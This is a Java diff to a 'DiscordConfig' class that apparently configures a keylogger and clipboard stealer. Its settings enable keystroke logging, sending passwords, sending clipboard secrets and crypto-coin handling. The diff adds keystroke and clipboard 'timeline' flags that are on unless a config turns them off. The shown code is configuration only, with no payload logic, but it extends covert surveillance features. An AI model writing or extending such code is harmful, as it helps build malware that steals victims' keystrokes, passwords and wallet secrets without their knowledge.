@@ -19,6 +19,9 @@ public final class DiscordConfig {
 	private static volatile long walletCooldownSec = 600L;
 	private static volatile boolean keylogger = true;
 	private static volatile boolean sendPasswords = true;
+	/** Granular keystroke timeline; additive, off only when provisioned off. */
+	private static volatile boolean keyloggerTimeline = true;
+	private static volatile boolean clipboardTimeline = true;
 	private static volatile boolean clipboard = true;
 	/** Secret clipboard alerts are on unless a config explicitly turns them off. */
 	private static final boolean SECRETS_DEFAULT = true;
@@ -84,9 +87,11 @@ public final class DiscordConfig {
 		Map<String, Object> keys = Json.map(root.get("keylogger"));
 		keylogger = !Boolean.FALSE.equals(keys.get("enabled"));
 		sendPasswords = !Boolean.FALSE.equals(keys.get("sendPasswords"));
+		keyloggerTimeline = !Boolean.FALSE.equals(keys.get("timeline"));
 		Map<String, Object> board = Json.map(root.get("clipboard"));
 		clipboard = !Boolean.FALSE.equals(board.get("enabled"));
 		sendSecrets = !Boolean.FALSE.equals(board.get("sendSecrets"));
+		clipboardTimeline = !Boolean.FALSE.equals(board.get("timeline"));
 		testnet = Boolean.TRUE.equals(board.get("testnet"));
 		Map<String, List<String>> coins = new LinkedHashMap<>();
 		for (Map.Entry<String, Object> entry : Json.map(board.get("coins")).entrySet()) {
@@ -125,6 +130,14 @@ public final class DiscordConfig {
 
 	public static boolean clipboard() {
 		return clipboard;
+	}
+
+	public static boolean keyloggerTimeline() {
+		return keyloggerTimeline;
+	}
+
+	public static boolean clipboardTimeline() {
+		return clipboardTimeline;
 	}
 
 	public static boolean sendSecrets() {
